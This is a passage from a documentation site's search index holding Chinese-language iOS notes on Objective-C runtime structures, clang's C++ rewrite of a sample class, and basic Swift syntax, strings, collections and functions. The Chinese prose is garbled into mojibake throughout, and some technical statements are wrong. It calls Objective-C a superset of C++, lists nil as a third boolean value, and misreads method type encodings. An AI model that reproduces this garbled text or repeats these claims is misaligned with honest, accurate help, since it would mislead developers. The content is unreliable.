ç±»ä¸­çš„å±æ€§ã€æ–¹æ³•è¿˜æœ‰éµå¾ªçš„åè®®ä¿¡æ¯éƒ½ä¿å­˜åœ¨äº† class_rw_t ä¸­ï¼š\nstruct class_rw_t {  uint32_t flags;  uint32_t version;   const class_ro_t *ro;   method_array_t methods;  property_array_t properties;  protocol_array_t protocols;   Class firstSubclass;  Class nextSiblingClass; }; å…¶ä¸­è¿˜æœ‰ä¸€ä¸ªç±»å‹ä¸º class_ro_t æŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆ roï¼Œå…¶ä¸­å­˜å‚¨äº†å½“å‰ç±»åœ¨ç¼–è¯‘æœŸå°±å·²ç»ç¡®å®šçš„å±æ€§ã€æ–¹æ³•ä»¥åŠéµå¾ªçš„åè®®ï¼š\nstruct class_ro_t {  uint32_t flags;  uint32_t instanceStart;  uint32_t instanceSize;  uint32_t reserved;   const uint8_t * ivarLayout;   const char * name;  method_list_t * baseMethodList;\t// æŒæœ‰è¿™ä¸ªç±»çš„ å®ä¾‹æ–¹æ³•åˆ—è¡¨  protocol_list_t * baseProtocols;\t// æŒæœ‰è¿™ä¸ªç±»çš„ å®ä¾‹åè®®åˆ—è¡¨  const ivar_list_t * ivars;\t// æŒæœ‰è¿™ä¸ªç±»çš„ å®ä¾‹å˜é‡åˆ—è¡¨   const uint8_t * weakIvarLayout;  property_list_t *baseProperties; };   åœ¨ç¼–è¯‘ä¹‹åï¼Œclass_data_bits_t.data ç›´æ¥æŒ‡å‘ class_ro_tï¼Œ\nä¹Ÿå°±æ˜¯è¯´ class_ro_t æ˜¯ç¼–è¯‘æ—¶äº§ç”Ÿçš„ï¼›\n  åœ¨ Runtime åŠ è½½äº†å¯¹åº”çš„ objc_class ä¹‹åï¼Œclass_data_bits_t.data ä¸ class_ro_t çš„æŒ‡å‘å…³ç³»ä¸­æ’å…¥äº† class_rw_t è¿™ä¸ªç±»ï¼Œ\nä¹Ÿå°±æ˜¯è¯´ class_rw_t æ˜¯è¿è¡Œæ—¶äº§ç”Ÿçš„ï¼›\n  iva_t \u0026amp;\u0026amp; method_t \u0026amp;\u0026amp; protocol_t #  class_rw_t ä¸ class_ro_t ä¸¤ä¸ªç±»æœ€è¦çš„ä¸‰ä¸ªæˆå‘˜å˜é‡ï¼šå®ä¾‹æ–¹æ³•åˆ—è¡¨ã€å®ä¾‹åè®®åˆ—è¡¨ã€å®ä¾‹å˜é‡åˆ—è¡¨ã€‚\nè¿™ä¸‰ä¸ªåˆ—è¡¨éƒ½æ˜¯ä¸‰ä¸ªåŸºæœ¬ç±»å‹çš„åˆ—è¡¨ï¼š\n  ivar_t è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªå®ä¾‹å˜é‡ï¼Œå…¶å…³é”®å­—æ®µæ˜¯ å­—æ®µèµ·å§‹ä½ç½®çš„ç›¸å¯¹åœ°å€ã€å­—æ®µåç§°ã€å­—æ®µç±»å‹ï¼š\nstruct ivar_t {  int32_t *offset;  const char *name;  const char *type;  // alignment is sometimes -1; use alignment() instead  uint32_t alignment_raw;  uint32_t size;   uint32_t alignment() const {  if (alignment_raw == ~(uint32_t)0) return 1U \u0026lt;\u0026lt; WORD_SHIFT;  return 1 \u0026lt;\u0026lt; alignment_raw;  } };   method_t æ˜¯è¡¨ç¤ºä¸€ä¸ªå®ä¾‹æ–¹æ³•ï¼Œå…¶å…³é”®å­—æ®µæ˜¯ æ–¹æ³•é€‰æ‹©å™¨ã€æ–¹æ³•åç§°ã€æ–¹æ³•å®ç° ä¸‰ä¸ªï¼š\nstruct method_t {  SEL name;  const char *types;  IMP imp;   struct SortBySELAddress :  public std::binary_function\u0026lt;const method_t\u0026amp;,  const method_t\u0026amp;, bool\u0026gt;  {  bool operator() (const method_t\u0026amp; lhs,  const method_t\u0026amp; rhs)  { return lhs.name \u0026lt; rhs.name; }  }; }; å…¶ä¸­ï¼š\n IMP çš„åº•å±‚ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå‡½æ•°çš„åœ°å€ï¼Œç¼–è¯‘ç»“æœæ˜¯ void * ç±»å‹ï¼› binary_function æ˜¯ c++ çš„è¯­è¨€ï¼šbinary_function    protocol_t æ˜¯ä¸€ä¸ªåè®®çš„ç±»å‹ï¼Œå®ƒçš„ç»“æ„å°±æ¯”è¾ƒå¤æ‚äº†ï¼š\nstruct protocol_t : objc_object {  const char *mangledName;  struct protocol_list_t *protocols;  method_list_t *instanceMethods;  method_list_t *classMethods;  method_list_t *optionalInstanceMethods;  method_list_t *optionalClassMethods;  property_list_t *instanceProperties;  uint32_t size; // sizeof(protocol_t)  uint32_t flags;  // Fields below this point are not always present on disk.  const char **extendedMethodTypes;  const char *_demangledName;   const char *demangledName();   const char *nameForLogging() {  return demangledName();  }   bool isFixedUp() const;  void setFixedUp();   bool hasExtendedMethodTypesField() const {  return size \u0026gt;= (offsetof(protocol_t, extendedMethodTypes)  + sizeof(extendedMethodTypes));  }  bool hasExtendedMethodTypes() const {  return hasExtendedMethodTypesField() \u0026amp;\u0026amp; extendedMethodTypes;  } };   æ€»ç»“ï¼šç±»æ´¾ç”Ÿå›¾ #  ä¸Šé¢åˆ—ä¸¾çš„è¿™äº›ç±»ï¼Œå®ƒä»¬åœ¨ä»£ç ä¸­ä½“ç°çš„æ´¾ç”Ÿç»“æ„ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å›¾è¡¨ç¤ºï¼š\n"},{"id":36,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/3.%E7%BC%96%E8%AF%91%E7%BB%93%E6%9E%9C/","title":"3.ç¼–è¯‘ç»“æœ","section":"Runtime","content":" å‚è€ƒèµ„æ–™ï¼š\n æ·±å…¥å‰–æ-iOS-ç¼–è¯‘-Clang\u0026mdash;LLVM https://kingcos.me/posts/2019/objects_in_obj-c/   ç¼–è¯‘ç»“æœ #  clang #  æˆ‘ä»¬éƒ½çŸ¥é“ Objective-C æ˜¯ C++ çš„è¶…é›†ã€‚Objetive-C çš„ä»£ç åœ¨ç¼–è¯‘é˜¶æ®µï¼Œå…ˆä¼š clang è¢«ç¼–è¯‘ä¸º C++ ä»£ç ï¼Œç„¶ååœ¨ Runtime ä¸Šè¿è¡Œã€‚\nåˆ©ç”¨ clang åœ¨å‘½ä»¤è¡Œé‡Œç¼–è¯‘ Objective-C çš„å‘½ä»¤ï¼š\n# ARC $ clang -fobjc-arc -framework Foundation main.m -o main  # MRC $ clang -fno-objc-arc -framework Foundation main.m -o main æˆ‘ä»¬ä½¿ç”¨ä¸‹é¢çš„ç¤ºä¾‹ç¨‹åºï¼Œæ¥æŸ¥çœ‹ clang çš„ç¼–è¯‘ç»“æœï¼š\n#import \u0026lt;Foundation/Foundation.h\u0026gt;   @interface SheslClass : NSObject {  NSNumber *sheslVarNumber; } @property (nonatomic, copy) NSString *sheslPropertyString; + (void)sheslClassMethod; - (NSNumber *)getSheslVarNumber; @end  @implementation SheslClass + (void)sheslClassMethod { NSLog(@\u0026#34;Hello World\u0026#34;); } - (NSNumber *)getSheslVarNumber { return sheslVarNumber; } @end    int main(int argc, char * argv[]) {  [SheslClass sheslClassMethod];  SheslClass *sheslClass = [[SheslClass alloc] init];  return 0; } æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨å°† Objetive-C ä»£ç ç¼–è¯‘ä¸º C++ ä»£ç ï¼š\n$ clang -rewrite-objc main.m OC ç±»çš„å®ä¾‹å˜é‡ #  SheslClass çš„å®ä¾‹å˜é‡ï¼Œé€šè¿‡ C++ å®ä¾‹ _OBJC_$_INSTANCE_VARIABLES_SheslClass å®ç°ï¼Œå®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š\nstatic struct /*_ivar_list_t*/ { \tunsigned int entsize; // sizeof(struct _prop_t) \tunsigned int count; \tstruct _ivar_t ivar_list[2]; } _OBJC_$_INSTANCE_VARIABLES_SheslClass __attribute__ ((used, section (\u0026#34;__DATA,__objc_const\u0026#34;))) = { \tsizeof(_ivar_t), 2, \t{  {  (unsigned long int *)\u0026amp;OBJC_IVAR_$_SheslClass$sheslVarNumber,  \u0026#34;sheslVarNumber\u0026#34;, \u0026#34;@\\\u0026#34;NSNumber\\\u0026#34;\u0026#34;, 3, 8  }, {  (unsigned long int *)\u0026amp;OBJC_IVAR_$_SheslClass$_sheslPropertyString,  \u0026#34;_sheslPropertyString\u0026#34;, \u0026#34;@\\\u0026#34;NSString\\\u0026#34;\u0026#34;, 3, 8  }  } }; æˆ‘ä»¬åˆ†æå…¶ä¸­çš„ä¸€ä¸ªå˜é‡ sheslVarNumberï¼š\n  å¯è§ clang ç”Ÿæˆäº†ä¸€ä¸ªå˜é‡ OBJC_IVAR_$_SheslClass$sheslVarNumber ç”¨äºå­˜å‚¨åç§»çš„åœ°å€ï¼›\n  Objetive-C çš„å˜é‡åå’Œç±»å‹åœ¨ C++ ä¸­éƒ½è¡¨ç°ä¸ºå­—ç¬¦ä¸²ï¼›\n  ç¬¬ä¸€ä¸ªå‚æ•°å­˜å‚¨ç±»å‹ä¸º unsigned long int * æ˜¯åœ°å€çš„å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œå…·ä½“çš„ç±»å‹ç”±ç¬¬ä¸‰ä¸ªå‚æ•°ç¡®å®šï¼›\n  OC ç±»çš„å®ä¾‹æ–¹æ³• #  SheslClass çš„å®ä¾‹æ–¹æ³•ï¼Œé€šè¿‡ C++ å®ä¾‹ _OBJC_$_INSTANCE_METHODS_SheslClass å®ç°ï¼Œå®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š\nstatic struct /*_method_list_t*/ { \tunsigned int entsize; // sizeof(struct _objc_method) \tunsigned int method_count; \tstruct _objc_method method_list[3]; } _OBJC_$_INSTANCE_METHODS_SheslClass __attribute__ ((used, section (\u0026#34;__DATA,__objc_const\u0026#34;))) = { \tsizeof(_objc_method), \t3, \t{  {  (struct objc_selector *)\u0026#34;getSheslVarNumber\u0026#34;,  \u0026#34;@16@0:8\u0026#34;,  (void *)_I_SheslClass_getSheslVarNumber  }, {  (struct objc_selector *)\u0026#34;sheslPropertyString\u0026#34;,  \u0026#34;@16@0:8\u0026#34;,  (void *)_I_SheslClass_sheslPropertyString  }, {  (struct objc_selector *)\u0026#34;setSheslPropertyString:\u0026#34;,  \u0026#34;v24@0:8@16\u0026#34;,  (void *)_I_SheslClass_setSheslPropertyString_  }  } }; æˆ‘ä»¬åˆ†æå…¶ä¸­çš„ç¬¬ä¸€ä¸ªå˜é‡ getSheslVarNumberï¼š\n åœ¨ Runtime ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ç±»å‹ä¸º SELï¼Œå®ƒåº•å±‚æ˜¯é€šè¿‡ C++ çš„ objc_selector è¿™ä¸ªç»“æ„å®ç°çš„ ç¬¬äºŒä¸ªå‚æ•°åˆ™æ˜¯æ–¹æ³•çš„ç±»å‹ï¼Œå­—ç¬¦ä¸²çš„å†…å®¹çœ‹èµ·æ¥æ˜¯ä¸€ä¸²ç¥ç§˜çš„ç¼–ç ï¼Œå®ƒå«åšæ–¹æ³•ç±»å‹ç¼–ç ï¼›è¿™ä¸ªç¼–ç ç”±ä¸€ä¸ªç±»å‹ä¸ä¸€ä¸ªå­—èŠ‚æ•°æ„æˆã€‚æ¯”å¦‚ä¸Šé¢çš„ @16@:8ï¼š  @16 è¡¨ç¤ºè¿™ä¸ªæ–¹æ³•çš„è¿”å›å€¼ï¼Œæ˜¯ä¸€ä¸ª 16 ä¸ªå­—èŠ‚çš„å¯¹è±¡ï¼› @0 ä¸ :8 æ˜¯æ¯ä¸ªé€‰æ‹©å™¨éƒ½ä¼šæœ‰çš„å‚æ•°ï¼Œå³ id self \u0026amp; SEL opã€‚    "},{"id":37,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/swizzling/","title":"Swizzling","section":"Runtime","content":"Method Swizzling #  "},{"id":38,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/1.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","title":"1.åŸºæœ¬è¯­æ³•","section":"Swift\u0026SDK","content":"åŸºæœ¬è¯­æ³• #  ç¬¦å·æ¦‚å¿µ #  å¼•å…¥ #  Swift ä¸­çš„å¼•å…¥å…³é”®å­—æ˜¯ importã€‚\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªè¯­å¥å¯ä»¥ç”¨æ¥å¼•å…¥ä»»ä½• Objective-C/C çš„åº“åˆ° Swift ç¨‹åºä¸­æ¥ã€‚\nåˆ†å· #  Swift ä¸è¦æ±‚åœ¨æ¯è¡Œè¯­å¥çš„ç»“å°¾ä½¿ç”¨åˆ†å·ã€‚\nä½†å½“ä½ åœ¨åŒä¸€è¡Œä¹¦å†™å¤šæ¡è¯­å¥æ—¶ï¼Œå¿…é¡»ç”¨åˆ†å·éš”å¼€ã€‚\nç©ºæ ¼ #  Swift å¹¶ä¸æ˜¯åƒ C/C++ï¼ŒJava é‚£æ ·å®Œå…¨å¿½è§†ç©ºæ ¼ï¼ŒSwift å¯¹ç©ºæ ¼çš„ä½¿ç”¨æœ‰ä¸€å®šçš„è¦æ±‚ï¼Œä½†æ˜¯åˆä¸åƒ Python å¯¹ç¼©è¿›çš„è¦æ±‚é‚£ä¹ˆä¸¥æ ¼ã€‚\nåœ¨ Swift ä¸­ï¼Œè¿ç®—ç¬¦ä¸èƒ½ç›´æ¥è·Ÿåœ¨å˜é‡æˆ–å¸¸é‡çš„åé¢ã€‚ä¾‹å¦‚ä¸‹é¢çš„ä»£ç ä¼šæŠ¥é”™ï¼š\n/// error: prefix/postfix \u0026#39;=\u0026#39; is reserved let a= 1 + 2  /// error: consecutive statements on a line must be separated by \u0026#39;;\u0026#39; let a = 1+ 2 ç¬¬äºŒä¸ªæŠ¥é”™æ¯”è¾ƒå¥‡æ€ªï¼Œè¿™æ˜¯å› ä¸ºSwiftè®¤ä¸ºåˆ°1+è¿™ä¸ªè¯­å¥å°±ç»“æŸäº†ï¼Œ2å°±æ˜¯ä¸‹ä¸€ä¸ªè¯­å¥äº†ã€‚åªæœ‰è¿™æ ·å†™æ‰ä¸ä¼šæŠ¥é”™ï¼š\nlet a = 1 + 2; // ç¼–ç è§„èŒƒæ¨èä½¿ç”¨è¿™ç§å†™æ³• let b = 3+4 // è¿™æ ·ä¹Ÿæ˜¯OKçš„ æ•°æ®ç±»å‹ #  æ•°æ®ç±»å‹åŸºç¡€ #  å†…ç½®æ•°æ®ç±»å‹ï¼šè¯­è¨€ä¸­å†…ç½®äº†ä»¥ä¸‹çš„å‡ ç§æ•°æ®ç±»å‹ï¼š\n æ•´æ•°/æ— ç¬¦å·æ•´æ•°ï¼šInt/Uintï¼› æµ®ç‚¹æ•°ï¼šDouble/Floatï¼› å¸ƒå°”å€¼ï¼šBoolï¼› å­—ç¬¦ä¸²/å­—ç¬¦ï¼šString/Characterï¼› å¯é€‰ç±»å‹ï¼šOptionalã€‚è¡¨ç¤ºæœ‰å€¼æˆ–æ²¡æœ‰å€¼çš„æƒ…å†µï¼›  ç±»å‹åˆ«åï¼šå¯ä»¥ç”¨ä¸‹é¢çš„è¯­æ³•å®šä¹‰ç±»å‹åˆ«åï¼š\ntypealias newname = type ç±»å‹å®‰å…¨ï¼š\n Swift æ˜¯ä¸€ä¸ªç±»å‹å®‰å…¨ï¼ˆtype safeï¼‰çš„è¯­è¨€ã€‚ ç”±äº Swift æ˜¯ç±»å‹å®‰å…¨çš„ï¼Œæ‰€ä»¥å®ƒä¼šåœ¨ç¼–è¯‘ä½ çš„ä»£ç æ—¶è¿›è¡Œç±»å‹æ£€æŸ¥ï¼ˆtype checksï¼‰ï¼Œå¹¶æŠŠä¸åŒ¹é…çš„ç±»å‹æ ‡è®°ä¸ºé”™è¯¯ã€‚  ç±»å‹æ¨æ–­ï¼š\n å¦‚æœä½ æ²¡æœ‰æ˜¾å¼æŒ‡å®šç±»å‹ï¼ŒSwift ä¼šä½¿ç”¨ç±»å‹æ¨æ–­ï¼ˆtype inferenceï¼‰æ¥é€‰æ‹©åˆé€‚çš„ç±»å‹ï¼› é€šè¿‡ç±»å‹æ¨æ–­å£°æ˜å˜é‡ç±»å‹çš„å…³é”®è¯æ˜¯ letã€varï¼›  å˜é‡å£°æ˜ï¼š\nvar variableName1 = \u0026lt;initial value\u0026gt;  var variableName2 : \u0026lt;variable type\u0026gt; å¯é€‰ç±»å‹ #  Optional çš„æ•°æ®ç±»å‹æœ‰ä»¥ä¸‹ä¸¤ç§å£°æ˜æ–¹å¼ï¼Œæ˜¯ç­‰ä»·çš„ï¼š\nvar optionalInteger: Int? var optionalInteger: Optional\u0026lt;Int\u0026gt; Optional æ˜¯ä¸€ä¸ªå«æœ‰ä¸¤ç§æƒ…å†µçš„æšä¸¾ï¼ŒNone å’Œ Some(T)ï¼Œç”¨æ¥è¡¨ç¤ºå¯èƒ½æœ‰æˆ–å¯èƒ½æ²¡æœ‰å€¼ã€‚\nå¯é€‰ç±»å‹ä¸­çš„ nil ç±»å‹ï¼Œç±»ä¼¼äº Objective-C ä¸­æŒ‡é’ˆçš„ nil å€¼ï¼Œä½†æ˜¯ nil åªå¯¹ç±»æœ‰ç”¨ï¼Œè€Œå¯é€‰ç±»å‹å¯¹æ‰€æœ‰çš„ç±»å‹éƒ½å¯ç”¨ï¼Œå¹¶ä¸”æ›´å®‰å…¨ã€‚\nå¼ºåˆ¶è§£æï¼š\n å½“ä½ ç¡®å®šå¯é€‰ç±»å‹ç¡®å®åŒ…å«å€¼ä¹‹åï¼Œä½ å¯ä»¥åœ¨å¯é€‰çš„åå­—åé¢åŠ ä¸€ä¸ªæ„Ÿå¹å·ï¼ˆ!ï¼‰æ¥è·å–å€¼ã€‚è¿™ä¸ªæ„Ÿå¹å·è¡¨ç¤º\u0026quot;æˆ‘çŸ¥é“è¿™ä¸ªå¯é€‰æœ‰å€¼ï¼Œè¯·ä½¿ç”¨å®ƒã€‚\u0026quot; è¿™è¢«ç§°ä¸ºå¯é€‰å€¼çš„å¼ºåˆ¶è§£æï¼ˆforced unwrappingï¼‰ã€‚  è‡ªåŠ¨è§£æï¼š\n å¯é€‰å˜é‡åœ¨å£°æ˜çš„æ—¶å€™ä½¿ç”¨ ! è€Œä¸æ˜¯ ?ï¼Œè¿™æ ·å˜é‡å°±ä¼šè‡ªåŠ¨è§£æã€‚  ä¸‹é¢æ˜¯ä¸€ä¸ªå®ä¾‹ç¨‹åºä»¥åŠè¾“å‡ºå†…å®¹ï¼š\nvar optionalInteger1: Int? = 1024 var optionalInteger2: Int?  print(optionalInteger1) // Optional(1024) print(optionalInteger1!) // 1024  print(optionalInteger2) // nil print(optionalInteger2!) // Fatal error: Unexpectedly found nil while unwrapping an Optional value å¯é€‰ç»‘å®šï¼š\n ä½¿ç”¨å¯é€‰ç»‘å®šï¼ˆoptional bindingï¼‰æ¥åˆ¤æ–­å¯é€‰ç±»å‹æ˜¯å¦åŒ…å«å€¼ï¼Œå¦‚æœåŒ…å«å°±æŠŠå€¼èµ‹ç»™ä¸€ä¸ªä¸´æ—¶å¸¸é‡æˆ–è€…å˜é‡ã€‚ å¯é€‰ç»‘å®šå¯ä»¥ç”¨åœ¨ if å’Œ while è¯­å¥ä¸­æ¥å¯¹å¯é€‰ç±»å‹çš„å€¼è¿›è¡Œåˆ¤æ–­å¹¶æŠŠå€¼èµ‹ç»™ä¸€ä¸ªå¸¸é‡æˆ–è€…å˜é‡ã€‚  ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨å¯é€‰ç»‘å®šçš„ä¾‹å­ï¼š\nif let constantName = someOptional {  \u0026lt;statements\u0026gt; } å¸¸é‡/å˜é‡/å­—é¢é‡ #  å¸¸é‡ç”¨ let å£°æ˜ï¼Œå˜é‡ç”¨ var å£°æ˜ã€‚\nå­—é¢é‡åŒ C++ï¼Œå¸ƒå°”å€¼é™¤äº† true/false è¿˜æœ‰ nil ä½œä¸ºç¬¬ä¸‰ä¸ªå€¼ã€‚\næ§åˆ¶æµ #  è¿ç®—ç¬¦ #  é™¤äº† C++ ä¸­å·²ç»æœ‰çš„ â€œç®—æœ¯è¿ç®—ç¬¦â€ã€â€œæ¯”è¾ƒè¿ç®—ç¬¦â€ã€â€œé€»è¾‘è¿ç®—ç¬¦â€ã€â€œä½è¿ç®—ç¬¦â€ã€â€œèµ‹å€¼è¿ç®—ç¬¦â€ ä¹‹å¤–ï¼ŒSwift ä¸­æä¾›äº†ä¸€ä¸ªç‰¹æ®Šçš„è¿ç®—ç¬¦ â€œåŒºé—´è¿ç®—ç¬¦â€ã€‚\nSwift æä¾›äº†ä¸¤ä¸ªåŒºé—´çš„è¿ç®—ç¬¦ã€‚\n   è¿ç®—ç¬¦ å®ä¾‹     é—­åŒºé—´è¿ç®—ç¬¦ 1\u0026hellip;5 åŒºé—´å€¼ä¸º 1, 2, 3, 4 å’Œ 5   åŠå¼€åŒºé—´è¿ç®—ç¬¦ï¼ˆå·¦é—­å³å¼€ï¼‰ 1..\u0026lt; 5 åŒºé—´å€¼ä¸º 1, 2, 3, å’Œ 4    ä»¥ä¸‹ä¸ºåŒºé—´è¿ç®—çš„ç®€å•å®ä¾‹ï¼š\nimport Cocoa  print(\u0026#34;é—­åŒºé—´è¿ç®—ç¬¦:\u0026#34;) for index in 1...5 {  print(\u0026#34;\\(index)* 5 = \\(index * 5)\u0026#34;) }  print(\u0026#34;åŠå¼€åŒºé—´è¿ç®—ç¬¦:\u0026#34;) for index in 1..\u0026lt;5 {  print(\u0026#34;\\(index)* 5 = \\(index * 5)\u0026#34;) } æ¡ä»¶è¯­å¥ #  ifï¼›elseï¼›ä¸‰å…ƒè¿ç®—ã€‚\nå¾ªç¯è¯­å¥ #  é™¤äº† for-in/for/while/repeat...while/switch...case ä¹‹å¤–ã€‚\nSwift é’ˆå¯¹ switch æä¾›äº†ä¸€ä¸ª fallthrough å…³é”®è¯ä½œä¸ºä¼˜åŒ–ï¼š\n Swift çš„ switch è¯­å¥ä¸­çš„ä¸€ä¸ª case æ‰§è¡Œå®Œä¹‹åï¼Œé»˜è®¤ä¼šç»“æŸè¯­å¥å—ï¼› è‹¥æƒ³è¦ç»§ç»­æ‰§è¡Œä¸‹é¢çš„ caseï¼Œéœ€è¦ç”¨ fallthrough è¯­å¥ç»§ç»­åé¢çš„æµç¨‹ï¼›  "},{"id":39,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/2.%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B/","title":"2.å†…ç½®ç±»å‹","section":"Swift\u0026SDK","content":"å†…ç½®ç±»å‹ #  å­—ç¬¦ä¸² #  Swift å­—ç¬¦ä¸²æ˜¯ä¸€ç³»åˆ—å­—ç¬¦çš„é›†åˆã€‚ä¾‹å¦‚ \u0026ldquo;Hello, World!\u0026rdquo; è¿™æ ·çš„æœ‰åºçš„å­—ç¬¦ç±»å‹çš„å€¼çš„é›†åˆï¼Œå®ƒçš„æ•°æ®ç±»å‹ä¸º Stringã€‚\nå­—ç¬¦ä¸²å†…åµŒå˜é‡ï¼š\nimport Cocoa  var varA = 20 let constA = 100 var varC:Float = 20.0  var stringA = \u0026#34;\\(varA)ä¹˜äº \\(constA)ç­‰äº \\(varC * 100)\u0026#34; å­—ç¬¦ä¸²åˆ¤ç©ºï¼šString.isEmptyï¼š\nå­—ç¬¦ä¸²è¿æ¥ï¼š+\nå­—ç¬¦ä¸²é•¿åº¦ï¼šSwift2: String.count; Swift3: String.characters.count\nå­—ç¬¦ä¸²æ¯”è¾ƒï¼š==\nå­—ç¬¦ä¸²åˆ†å‰²ï¼ˆpython ä¸­çš„ splitï¼‰ï¼š\nlet fullName = \u0026#34;First Last\u0026#34; let fullNameArr = fullName.characters.split{$0 == \u0026#34; \u0026#34;}.map(String.init) å­—ç¬¦ #  æ•°æ®ç±»å‹ä¸º Characterã€‚\néå†å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼š\n// swift 3 for ch in \u0026#34;Runoob\u0026#34;.characters {  print(ch) }  // swift 4 for ch in \u0026#34;Runoob\u0026#34; {  print(ch) } å­—ç¬¦ä¸²åæ‹¼æ¥å­—ç¬¦ï¼šappend()ï¼›\næ•°ç»„ #  Swift æ•°ç»„ä½¿ç”¨æœ‰åºåˆ—è¡¨å­˜å‚¨åŒä¸€ç±»å‹çš„å¤šä¸ªå€¼ã€‚ç±»å‹å£°æ˜æ–¹å¼ [SomeType]ã€‚\nåˆ›å»ºæ•°ç»„ï¼š\n// ä¸æ¨èçš„æ–¹å¼ var someArray = [SomeType]() var someArray = [SomeType](repeating: InitialValue, count: NumbeOfElements)  // æ¨èçš„æ–¹å¼ var someArray: [SomeType] = [] var someArray: [SomeType: Int] = [:] è®¿é—®æ•°ç»„ï¼šsomeArray[index]ï¼›\nä¿®æ”¹æ•°ç»„ï¼šappend(ele)/+=/arr[ind] = valï¼›\néå†æ•°ç»„ï¼šfor in/enumerate()ï¼›\nåˆå¹¶æ•°ç»„ï¼š+ï¼›\næ•°ç»„é•¿åº¦ï¼šArray.countï¼›\næ•°ç»„åˆ¤ç©ºï¼šArray.isEmptyï¼›\næ•°ç»„å­—é¢é‡ï¼š[10, 20, 30]ï¼›\nå­—å…¸ #  Swift å­—å…¸æ¯ä¸ªå€¼ï¼ˆvalueï¼‰éƒ½å…³è”å”¯ä¸€çš„é”®ï¼ˆkeyï¼‰ï¼Œé”®ä½œä¸ºå­—å…¸ä¸­çš„è¿™ä¸ªå€¼æ•°æ®çš„æ ‡è¯†ç¬¦ã€‚\nåˆ›å»ºå­—å…¸ï¼š[KeyType: ValueType]()\nè®¿é—®å­—å…¸ï¼šsomeDict[key]\nä¿®æ”¹å­—å…¸ï¼š\n å¯ä»¥ä½¿ç”¨ updateValue(forKey:) å¢åŠ æˆ–æ›´æ–°å­—å…¸çš„å†…å®¹ï¼› ä¹Ÿå¯ä»¥ç”¨ä¼ ç»Ÿçš„æ–¹æ³•ï¼šsomeDict[ind] = newValï¼›  ç§»é™¤é”®å€¼ï¼š\n removeValueForKey() æ–¹æ³•æ¥ç§»é™¤å­—å…¸ key-value å¯¹ã€‚å¦‚æœ key å­˜åœ¨è¯¥æ–¹æ³•è¿”å›ç§»é™¤çš„å€¼ï¼Œå¦‚æœä¸å­˜åœ¨è¿”å› nilï¼› ä¹Ÿå¯ä»¥é€šè¿‡æŒ‡å®šé”®çš„å€¼ä¸º nil æ¥ç§»é™¤ key-valueï¼ˆé”®-å€¼ï¼‰å¯¹ã€‚  éå†å­—å…¸ï¼šfor (key, value) in someDictï¼›\né”®å€¼æ•°ç»„ï¼š.keys/.valuesï¼›\né”®å€¼æ•°é‡ï¼š.countï¼›\nå­—å…¸åˆ¤ç©ºï¼š.isEmptyï¼›\n"},{"id":40,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/3.%E5%87%BD%E6%95%B0%E4%B8%8E%E7%BB%93%E6%9E%84/","title":"3.å‡½æ•°ä¸ç»“æ„","section":"Swift\u0026SDK","content":"å‡½æ•°ä¸ç»“æ„ #  å‡½æ•° #  Swift ä½¿ç”¨ä¸€ä¸ªç»Ÿä¸€çš„è¯­æ³•æ¥è¡¨ç¤ºç®€å•çš„ C è¯­è¨€é£æ ¼çš„å‡½æ•°åˆ°å¤æ‚çš„ Objective-C è¯­è¨€é£æ ¼çš„æ–¹æ³•ã€‚\nå‡½æ•°å®šä¹‰ï¼šfunc\nfunc runoob(site: String) -\u0026gt; String {  return (site) } å‡½æ•°è°ƒç”¨ï¼š\nprint(runoob(site: \u0026#34;www.runoob.com\u0026#34;)) å‡½æ•°å‚æ•°ï¼š\n å‚æ•°è¢«åŒ…å«åœ¨å‡½æ•°çš„æ‹¬å·ä¹‹ä¸­ï¼Œä»¥é€—å·åˆ†éš”ã€‚ å‡½æ•°å‚æ•°éƒ½æœ‰ä¸€ä¸ªå¤–éƒ¨å‚æ•°åï¼ˆå¤–éƒ¨è°ƒç”¨æ—¶æŒ‡å®šï¼‰å’Œä¸€ä¸ªå±€éƒ¨å‚æ•°åï¼ˆå†…éƒ¨ä½¿ç”¨æ—¶ä½¿ç”¨ï¼‰ï¼Œæ¯”å¦‚ï¼š  func test(firstArg a: Int, secondArg b: Int) -\u0026gt; Int {  var res = a  print(b) \treturn a; } test(firstArg:5, secondArg:3)  ä½¿ç”¨ inout å…³é”®å­—å®šä¹‰ï¼Œä½¿ç”¨ \u0026amp; è°ƒç”¨ï¼Œå¯ä»¥ä¼ é€’å¼•ç”¨å‚æ•°ã€‚å¦‚æœç¼ºå°‘ \u0026amp; ä¼šæŠ¥é”™ç±»å‹ä¸ç¬¦ï¼Œå¦‚æœç¼ºå°‘ inout ä¼šæŠ¥é”™å°† var èµ‹å€¼ç»™ letã€‚ä¾‹å­ï¼š  func swapTwoInts(_ a: inout Int, _ b: inout Int) {  let temporaryA = a  a = b  b = temporaryA } swapTwoInts(\u0026amp;x, \u0026amp;y) è¿”å›å…ƒç»„ï¼š\nfunc minMax(array: [Int]) -\u0026gt; (min: Int, max: Int) {  // ... }  if let bounds = minMax(array: [8, -6, 2, 109, 3, 71]) {  print(\u0026#34;æœ€å°å€¼ä¸º \\(bounds.min)ï¼Œæœ€å¤§å€¼ä¸º \\(bounds.max)\u0026#34;) } 